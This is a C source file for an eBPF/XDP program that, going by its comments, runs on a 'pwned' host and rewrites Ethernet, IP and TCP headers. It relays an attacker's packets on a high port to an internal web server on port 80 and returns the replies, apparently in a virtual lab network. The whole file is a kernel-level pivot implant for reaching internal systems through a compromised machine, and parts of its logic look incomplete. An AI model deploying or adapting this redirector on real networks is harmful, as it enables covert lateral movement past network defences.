
// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause
#include <linux/bpf.h>
#include <linux/in.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/udp.h>
#include <linux/tcp.h>

#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>

#include "xdp_parse.h"
#include "xdp_redirect.h"
#include "csum.h"

#ifndef memcpy
 #define memcpy(dest, src, n) __builtin_memcpy((dest), (src), (n))
#endif

char LICENSE[] SEC("license") = "Dual BSD/GPL";

struct Connection
{
    __u8 mac[ETH_ALEN];
    __be32 ip;
    __be16 port;
};

SEC("xdp_redirect")
int xdp_redirector(struct xdp_md *ctx)
{
    void* data = (void*)(long) ctx->data;
    void* dataEnd = (void*)(long) ctx->data_end;

    // Track start of each layer as its processed
	void* dataCursor;
    
    struct ethhdr *ethernetHeader;
    struct iphdr *ipv4Header;
    struct tcphdr *tcpHeader;
    struct ethhdr ethernetHeaderOrig;
    struct iphdr ipv4HeaderOrig;
    struct tcphdr tcpHeaderOrig;

    dataCursor = data;

    int retVal;
    int ifindex = 2;
    int action = XDP_PASS;

    // Turn these into bpfmaps, need for redirection
    __u8 macAtk[ETH_ALEN] = { 0x08, 0x00, 0x27, 0xc7, 0xe1, 0x36 };
    __u8 macRed[ETH_ALEN] = { 0x08, 0x00, 0x27, 0x1c, 0xd1, 0x63 };
    __u8 macTgt[ETH_ALEN] = { 0x08, 0x00, 0x27, 0x10, 0xcb, 0x4e };
    __be32 ipAtk = 0x402000A; // 10.0.2.4   - atker
    __be32 ipRed = 0xF02000A; // 10.0.2.15  - pwned
    __be32 ipTgt = 0x502000A; // 10.0.2.5   - internal webserver
    __be16 redPort = 0x9F40;  // Port 40768 - Redirector listening port "random" ephemeral
    __be16 tgtPort = 0x0050;  // Port 80    - Target port on internal side

    struct Connection forward = { .mac = macTgt, .ip = ipTgt, .port = tgtPort };
    struct Connection reverse = { .mac = macAtk, .ip = ipAtk, .port = redPort };

	retVal = parse_ethhdr(&dataCursor, dataEnd, &ethernetHeader);
    
    // Check if we recv'd 0x800 IPv4 protocol
	if ( bpf_ntohs(retVal) != ETH_P_IP )
		goto xdp_action;

    retVal = parse_ipv4hdr(&dataCursor, dataEnd, &ipv4Header);
   
   // Check if we recv'd 0x6 TCP protocol
    if ( retVal != IPPROTO_TCP )
        goto xdp_action;

    retVal = parse_tcphdr(&dataCursor, dataEnd, &tcpHeader);

    // Check if we have an expected TCP header size
    if ( retVal < 20 )
        goto xdp_action;

    // Make new headers (don't throw away original data yet)
    ethernetHeaderOrig = *ethernetHeader;
    ipv4HeaderOrig = *ipv4Header;
    tcpHeaderOrig = *tcpHeader;

    // Forward (Atk to Tgt)
    if ( ipv4Header->saddr == ipAtk && bpf_ntohs(tcpHeader->dest) == redPort )
    {
        bpf_printk("\nForward packet received:");
        bpf_printk("src ip = 0x%04X, dst ip = 0x%04X", ipv4Header->saddr, ipv4Header->daddr);
        bpf_printk("src port = %d, dst port = %d", bpf_ntohs(tcpHeader->source), bpf_ntohs(tcpHeader->dest));
        bpf_printk("L3 L4 Checksums: ip: 0x%02X tcp: 0x%02X\n", ipv4HeaderOrig.check, tcpHeaderOrig.check);

        // Update L2 Addresses
        memcpy(ethernetHeader->h_source, ethernetHeader->h_dest, sizeof(ethernetHeader->h_source));
        memcpy(ethernetHeader->h_dest, forward.mac, sizeof(ethernetHeader->h_dest));

        // Update L3 Addresses
        ipv4Header->saddr = ipv4Header->daddr;
        ipv4Header->daddr = forward.ip;
        
        // Update L4 Port
        tcpHeader->dest = forward.port;

        // Update L4 checksum
        tcpHeader->check = 0;
        tcpHeader->check = tcp_checksum(tcpHeader, sizeof(struct tcphdr));

        // Update L3 checksum
        ipv4Header->check = 0;
        ipv4Header->check = ip_checksum(ipv4Header, sizeof(struct iphdr));

        // Redirect the packet out the same interface it came in on
        bpf_printk("\nUpdating packet parameters...");
        bpf_printk("src ip = 0x%04X, dst ip = 0x%04X", ipv4Header->saddr, ipv4Header->daddr);
        bpf_printk("src port = %d, dst port = %d", bpf_ntohs(tcpHeader->source), bpf_ntohs(tcpHeader->dest));
        bpf_printk("L3 L4 Checksums: ip: 0x%02X tcp: 0x%02X", ipv4Header->check, tcpHeader->check);

        bpf_printk("###############################################\n");

        action = XDP_TX;
    }

    // Reverse (Tgt to Atk)
    else if ( ipv4Header->saddr == ipTgt && bpf_ntohs(tcpHeader->dest) == redPort )
    {
        bpf_printk("\nReverse packet received:");
        bpf_printk("src ip = 0x%04X, dst ip = 0x%04X", ipv4Header->saddr, ipv4Header->daddr);
        bpf_printk("src port = %d, dst port = %d", bpf_ntohs(tcpHeader->source), bpf_ntohs(tcpHeader->dest));
        bpf_printk("L3 L4 Checksums: ip: 0x%02X tcp: 0x%02X\n", ipv4HeaderOrig.check, tcpHeaderOrig.check);

        // Update L2 Addresses
        memcpy(ethernetHeader->h_source, ethernetHeader->h_dest, sizeof(ethernetHeader->h_source));
        memcpy(ethernetHeader->h_dest, reverse.mac, sizeof(ethernetHeader->h_dest));

        // Update L3 Addresses
        ipv4Header->saddr = ipv4Header->daddr;
        ipv4Header->daddr = reverse.ip;
        
        // Update L4 Port
        tcpHeader->dest = reverse.port;

        // Update L4 checksum
        tcpHeader->check = 0;
        tcpHeader->check = tcp_checksum(tcpHeader, sizeof(struct tcphdr));

        // Update L3 checksum
        ipv4Header->check = 0;
        ipv4Header->check = ip_checksum(ipv4Header, sizeof(struct iphdr));

        // Redirect the packet out the same interface it came in on
        bpf_printk("\nUpdating packet parameters...");
        bpf_printk("src ip = 0x%04X, dst ip = 0x%04X", ipv4Header->saddr, ipv4Header->daddr);
        bpf_printk("src port = %d, dst port = %d", bpf_ntohs(tcpHeader->source), bpf_ntohs(tcpHeader->dest));
        bpf_printk("L3 L4 Checksums: ip: 0x%02X tcp: 0x%02X", ipv4Header->check, tcpHeader->check);

        bpf_printk("###############################################\n");

        action = XDP_TX;
    }

xdp_action:
	return action;
}